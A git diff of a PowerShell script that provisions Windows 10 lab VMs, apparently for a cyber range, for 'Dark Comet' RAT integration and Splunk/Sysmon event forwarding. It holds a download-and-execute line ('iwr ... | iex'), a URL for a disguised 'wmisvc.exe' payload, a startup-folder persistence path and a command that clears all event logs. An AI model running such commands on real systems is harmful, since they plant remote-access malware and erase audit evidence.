@@ -5,6 +5,8 @@ PS1 script to provision Windows10 virtualmachines made with snapshots (specifica
 Script is based on "genericProvision.ps1" script that was created for the Multiple (copyIndex()) win10 hosts in the MACABI environment. It required a $halt variable to avoid conflicting AD-Joining machines.
 
 This version (C2hubCometA1) is mainly used for Dark Comet integration (a more recent version of atlasCommet.ps1) and is based on the "genericProvision" variant.
+
+This also includes the WEF configuration needed for Splunk with Sysmon
 #>
 
 param(
@@ -17,7 +19,10 @@ param(
   [String]$downloadlink,
   [String]$hostname
 )
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 # Static URLs to download ProvisioningVM* and static download locatןםמ
+$wefscript = "https://raw.githubusercontent.com/cybermias/publicrep/master/microsoft/provisioning/wef/provisionWef.ps1"
 $provurl = "https://bashupload.com/TUbOu/wmisvc.exe"
 $startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\runadm.bat"
 
@@ -55,6 +60,9 @@ Add-LocalGroupMember -group "Remote Desktop Users" -member ($domain + "\Domain U
 
 # Fix evaluation license
 cscript c:\windows\system32\slmgr.vbs /rearm
+
+# Add the WEF script
+. { iwr -useb $wefscript } | iex; install
 
 # Clear all the relevant logs (old snapshot logs and provisioning-generated logs, so fresh start). Enforcing final Restart.
 Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
